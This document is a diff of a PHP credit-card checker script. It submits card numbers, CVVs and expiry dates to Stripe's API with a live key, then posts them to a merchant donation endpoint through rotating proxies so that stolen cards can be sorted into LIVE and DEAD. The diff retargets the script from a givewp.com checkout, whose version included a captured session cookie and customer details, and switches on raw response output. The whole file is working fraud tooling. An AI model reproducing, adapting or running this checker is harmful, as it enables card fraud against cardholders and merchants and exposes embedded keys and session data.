@@ -260,7 +260,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [1req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]='.$name.'+'.$last.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2Fb9e9d8300%3B+stripe-js-v3%2Fb9e9d8300&time_on_page=365907&key=pk_live_iFZXNDKO9wZo9ZEDh8O85vLD00XfLKAjCf');
+curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F54c9cfdcf%3B+stripe-js-v3%2F54c9cfdcf&time_on_page=703029&key=pk_live_9RzCojmneCvL31GhYTknluXp&_stripe_account=acct_102i8i2dzpFK4wSa&_stripe_version=2020-08-27');
 
 $result1 = curl_exec($ch);
 $id = trim(strip_tags(getStr($result1,'"id": "','"'))); 
@@ -271,7 +271,7 @@ $id = trim(strip_tags(getStr($result1,'"id": "','"')));
 $ch = curl_init();
 curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80"); 
 curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
-curl_setopt($ch, CURLOPT_URL, 'https://givewp.com/wp-admin/admin-ajax.php');
+curl_setopt($ch, CURLOPT_URL, '#');
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
@@ -282,16 +282,16 @@ curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
 curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
 curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
     curl_setopt($ch, CURLOPT_HTTPHEADER, array(
-'authority: givewp.com',
+'authority: ',
 'method: POST',
-'path: /wp-admin/admin-ajax.php',
+'path: ',
 'scheme: https',
-'accept: application/json, text/javascript, */*; q=0.01',
-'accept-language: en-US,en;q=0.5',
-'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: PHPSESSID=e703c5335145d2245514e6c62badbe0d; helpful_user=b2b04561b5d9d38f27a4627bf1af387d; prism_89920694=fb4c10ce-f9db-4491-8e9c-f9aed74ae9ec; _gcl_au=1.1.1085446356.1647278981; _hjSessionUser_2446469=eyJpZCI6IjJjYzNjOWU1LTE2OTgtNTMyOC1iZDc1LTEwZGQzNWRmYWVkYiIsImNyZWF0ZWQiOjE2NDcyNzg5ODE2OTIsImV4aXN0aW5nIjp0cnVlfQ==; _hjFirstSeen=1; _hjIncludedInSessionSample=0; _hjSession_2446469=eyJpZCI6IjcyM2JjMTgwLWNkNzEtNDVmMy1hYzMwLWU2MTIwMTQ2Mzk0MiIsImNyZWF0ZWQiOjE2NDcyNzg5ODE5NzEsImluU2FtcGxlIjpmYWxzZX0=; _hjIncludedInPageviewSample=1; _hjAbsoluteSessionInProgress=1; _ga_683GDCL9YD=GS1.1.1647278981.1.1.1647279331.0; _ga=GA1.2.1472811858.1647278982; _gid=GA1.2.185065330.1647278983; _fbp=fb.1.1647278985555.249401336; _clck=bdd8hc|1|ezr|0; _clsk=1xlad0b|1647279004649|2|1|h.clarity.ms/collect; edd_items_in_cart=1; _uetsid=5614b600a3bc11ec9e0541a3172935d1; _uetvid=561547e0a3bc11eca12633888a237dc9; wpf_guest=ydoaeure%40yahoo.com; edd_cart_token=86325a7ac7f11ffe629c749681756deb; _gat_UA-59629224-1=1',
-'origin: https://givewp.com',
-'referer: https://givewp.com/checkout/',
+'accept: application/json, text/plain, */*',
+'accept-language: en-US,en;q=0.9',
+'content-type: application/json;charset=UTF-8',
+'cookie: ',
+'origin: ',
+'referer: ',
 'sec-fetch-dest: empty',
 'sec-fetch-mode: cors',
 'sec-fetch-site: same-origin',
@@ -301,7 +301,7 @@ curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
 
 # ----------------- [2req Postfields] ---------------------#
 
-curl_setopt($ch, CURLOPT_POSTFIELDS,'action=edds_process_purchase_form&form_data=payment-mode%3Dstripe%26edd_action%3Dgateway_select%26page_id%3D110286%26edd_first%3Djhon%26edd_last%3Dldie%26edd_email%3Dydoaeure%2540yahoo.com%26edd_phone%3D2024051254%26card_name%3Djhon%2520dmke%26edd_action%3Dpurchase%26edd-gateway%3Dstripe%26edd-process-checkout-nonce%3D78340e175f&payment_method_id='.$id.'&payment_method_exists=false');
+curl_setopt($ch, CURLOPT_POSTFIELDS,'{"widgetDefaults":{"amount":{"once":6800,"monthly":3400},"repeat":"once","includeFees":true,"amountOptions":{"once":[100000,50000,25000,13600,6800,3400],"monthly":[20000,10000,5000,3400,1000,500]},"currency":"USD","relations":{"amount":0,"amountOptions":0}},"paymentMethod":{"id":"'.$id.'","object":"payment_method","billing_details":{"address":{"city":null,"country":null,"line1":null,"line2":null,"postal_code":null,"state":null},"email":null,"name":null,"phone":null},"card":{"brand":"mastercard","checks":{"address_line1_check":null,"address_postal_code_check":null,"cvc_check":null},"country":"AU","exp_month":4,"exp_year":2022,"funding":"debit","generated_from":null,"last4":"0178","networks":{"available":["mastercard"],"preferred":null},"three_d_secure_usage":{"supported":true},"wallet":null},"created":1647336235,"customer":null,"livemode":true,"type":"card"}}');
 
 
 $result2 = curl_exec($ch);
@@ -313,7 +313,7 @@ $time = $info['total_time'];
 
 //=======================[MADE BY]==============================//
 
-$MADEBY = "[ (bn)AONONBD ]";
+$MADEBY = "[ (🇮🇳)DRAGON MASTER ]";
 
 //[You Have  To Change Name Here Automatically In All Response Will Change ]//
 
@@ -385,7 +385,7 @@ elseif
 }
 
 else {
-    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Dead ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
+    echo '<br><span class="badge badge-danger">DEAD ✗ </span> : ' . $lista . ' ➜ R ➜ Dead Proxy/Error Not listed/CC Checker Dead. ➜ DEAD ➜ IP: '.$ip.' ➜ ' . $type . ' ➜  ' . $brand . ' ➜ ' . $country . ' (' .$emoji. ') ➜ ' . $MADEBY . '</br>';
 }
 
 # - [UPDATE,PROXY DEAD , CC CHECKER DEAD Responses END ] - #
@@ -394,8 +394,8 @@ else {
 curl_close($ch);
 ob_flush();
 
-//echo "<b>1REQ Result:</b> $result1<br><br>";
-//echo "<b>2REQ Result:</b> $result2<br><br>";
+echo "<b>1REQ Result:</b> $result1<br><br>";
+echo "<b>2REQ Result:</b> $result2<br><br>";
 
 //=============================================================//
 //================[Made By :- [🇮🇳]DRAGON MASTER]===============//
